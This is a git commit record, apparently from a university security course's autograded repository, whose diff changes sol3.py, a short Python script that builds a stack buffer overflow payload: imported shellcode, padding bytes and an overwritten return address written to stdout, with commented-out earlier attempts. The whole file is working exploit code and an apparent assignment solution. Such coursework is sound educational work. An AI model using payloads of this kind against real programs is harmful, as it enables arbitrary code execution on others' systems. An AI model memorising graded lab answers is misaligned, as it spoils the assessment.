da6f51c1edfeba1e21db72324c367726f4327ff8
Libby Cox <libbycox@umich.edu>
2025-04-02 00:30:29 +0000

    Automatic commit by test script for libbycox

--- sol3.py
+++ sol3.py
@@ -4,7 +4,7 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write(shellcode + (2048-54)*b'A'+(0x7ffffff6d528).to_bytes(8,"little"))
+sys.stdout.buffer.write(shellcode + (2048-54)*b'A'+(0x7ffffff6d520).to_bytes(8,"little"))
 
 #sys.stdout.buffer.write((0x810-54)*b'A'+shellcode+(8*b'A')+(0x0000000000401e02).to_bytes(8,"little"))
 #sys.stdout.buffer.write((b'A'*2002)+shellcode+(0x0000000000401e02).to_bytes(8,"little"))
